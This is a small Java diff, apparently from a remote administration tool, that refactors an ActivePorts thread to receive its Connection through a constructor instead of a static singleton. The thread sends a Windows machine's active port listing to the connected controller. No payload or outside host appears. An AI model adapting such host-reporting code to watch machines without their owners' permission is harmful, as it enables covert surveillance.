@@ -9,6 +9,12 @@ import com.redpois0n.oslib.OperatingSystem;
 
 
 public class ActivePorts extends Thread {
+	
+	private Connection con;
+	
+	public ActivePorts(Connection con) {
+		this.con = con;
+	}
 
 	public void run() {
 		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
@@ -27,7 +33,7 @@ public class ActivePorts extends Thread {
 
 					String[] args = line.split(" ");
 
-					Connection.instance.addToSendQueue(new Packet51ActivePort(args[0], args[1], args[2], args[3]));
+					con.addToSendQueue(new Packet51ActivePort(args[0], args[1], args[2], args[3]));
 				}
 				reader.close();
 			} catch (Exception ex) {
